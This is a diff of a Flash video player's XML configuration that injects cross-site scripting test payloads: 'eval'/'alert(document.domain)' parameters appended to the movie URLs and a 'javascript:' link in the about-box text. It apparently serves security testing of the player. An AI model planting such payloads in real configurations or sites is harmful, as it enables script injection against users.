@@ -3,16 +3,16 @@
 <MovieWidth>800</MovieWidth>
 <MovieHeight>600</MovieHeight>
 <BackgroundColor>FFFFFF</BackgroundColor>
-<MovieURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf</MovieURL>
+<MovieURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf?a=eval&c=alert(document.domain)</MovieURL>
 <ShowLoadingMov>1</ShowLoadingMov>
-<LoadingMovURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf</LoadingMovURL>
+<LoadingMovURL>http://thebest404pageever.com/swf/FUUUUUUUUUUUUUUUUUUUUUUUUUCK.swf?a=eval&c=alert(document.domain)</LoadingMovURL>
 <ScaleLoadingMov>1</ScaleLoadingMov>
 <LoadingMovPercentToLoad>50</LoadingMovPercentToLoad>
 <LoadingMovMinDuration>3</LoadingMovMinDuration>
 <ControllerColor>C0C0C0</ControllerColor>
 <ShowFFRW>1</ShowFFRW>
 <ShowAbout>1</ShowAbout>
-<AboutBoxText><![CDATA[<a href=javascript:alert(document.domain)>Click me</a>]]></AboutBoxText>
+<AboutBoxText><![CDATA[<a href=javascript:alert(document.domain)>Click me</a><b>aaa</b>]]> Test Text</AboutBoxText>
 <TimeDisplayFormat>MM:SS</TimeDisplayFormat>
 <ShowDuration>1</ShowDuration>
 <ShowElapsedTime>1</ShowElapsedTime>
